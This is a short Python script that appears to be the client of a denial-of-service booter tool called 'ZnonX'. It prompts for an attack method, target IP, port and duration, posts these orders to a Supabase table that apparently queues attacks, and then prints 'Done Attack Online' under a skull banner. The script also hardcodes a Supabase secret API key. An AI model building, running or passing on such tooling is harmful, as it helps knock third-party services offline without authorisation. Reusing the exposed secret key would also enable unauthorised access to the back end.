import os
import requests
import colorama

class Color:
    colorama.init(autoreset=True)
    LB = colorama.Fore.LIGHTBLUE_EX
    LC = colorama.Fore.LIGHTCYAN_EX
    LG = colorama.Fore.LIGHTGREEN_EX
    LR = colorama.Fore.LIGHTRED_EX
    LY = colorama.Fore.LIGHTYELLOW_EX
    RESET = colorama.Fore.RESET


def home(ah, ip, port, Time):
    os.system("clear")

    ASCII = Color.LR + f"""
                      :::!~!!!!!:.
                .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
            :!!!!!!?H! :!$!$$$$$$$$$$8X:
            !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
            :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
            ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
            !:~~~ .:!M"T#$$$$WX??#MRRMMM!
            ~?WuxiW*`   `"#$$$$8!!!!??!!!
            :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
        :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~

                      Tool ZnonX                 
                      github.com/NotFound                             
                      Version:V1
        """
    print(ASCII)
    print(" Done Attack  Online ")
    print(f" Method : {ah}")
    print(f" Target : {ip}")
    print(f" Port : {port}")
    print(f" Time : {Time}")


SUPABASE_URL = "https://thmtvthwdhnglwejbatg.supabase.co/rest/v1/requests"
SUPABASE_KEY = "sb_secret_2tH8QCobmJfVfv1zn-OoPw_2uwK2cKO"

HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json"
}

ah = input("join method :")

if ah == "HTTP":
    print("Done By keyess", ah)
    ip = input("Target :")
    port = input("Port : ")
    time = input("Time :")

    data = {
        "method": ah,
        "ip": ip,
        "port": port,
        "Time": time
    }

    req = requests.post(SUPABASE_URL, json=data, headers=HEADERS)

    if req.status_code == 201:
        print("Done Sent By Keyess")
        home(ah, ip, port, time)
    else:
        print("not found")

else:
    print(" Keyess not found")
